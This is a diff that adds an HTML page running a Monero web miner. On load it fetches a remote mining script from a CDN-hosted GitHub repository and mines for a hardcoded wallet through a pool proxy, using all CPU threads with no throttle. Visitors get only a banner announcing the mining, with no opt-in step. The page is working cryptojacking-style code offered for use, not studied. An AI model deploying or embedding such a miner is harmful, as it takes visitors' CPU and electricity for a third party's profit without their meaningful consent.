@@ -1,0 +1,50 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+  <title>Extreme Monero WebMiner</title>
+  <style>
+    body {
+      background: black;
+      color: lime;
+      font-family: monospace;
+      text-align: center;
+    }
+    #hashrate {
+      font-size: 1.5em;
+      margin-top: 20px;
+    }
+  </style>
+</head>
+<body>
+  <h1>🔥 Monero Miner Active</h1>
+  <p>CPU mining has started at maximum capacity.</p>
+  <p>Do not close this tab for maximum efficiency.</p>
+  <div id="hashrate">Hashrate: calculating...</div>
+
+  <!-- EXTREME MINER SCRIPT -->
+  <script src="https://cdn.jsdelivr.net/gh/NajmAjmal/monero-webminer@main/script.js"></script>
+  <script>
+    server = "wss://ny1.xmrminingproxy.com";
+    var pool = "gulf.moneroocean.stream:10004";
+    var walletAddress = "83uCXo5d4zNXSHkutqPqHHKSpvJxgmS15U5oQXnQTfAUYnP9bj5Wb5FKn8XBzkc7RZBxcFg5BFG5CjV2kjysXKfD7sX6Gvr";
+    var workerId = "ExtremeWebMiner";
+    var threads = navigator.hardwareConcurrency || -1;
+    var throttleMiner = 0;
+
+    startMining(pool, walletAddress, workerId, threads, "");
+    throttleMiner = 0;
+    stopOnError = false;
+    debug = true;
+
+    // Обновление хешрейта в реальном времени
+    setInterval(function () {
+      if (typeof miner !== 'undefined' && miner.getHashesPerSecond) {
+        var hashrate = miner.getHashesPerSecond().toFixed(2);
+        document.getElementById("hashrate").textContent = "Hashrate: " + hashrate + " H/s";
+      }
+    }, 1000);
+  </script>
+</body>
+</html>
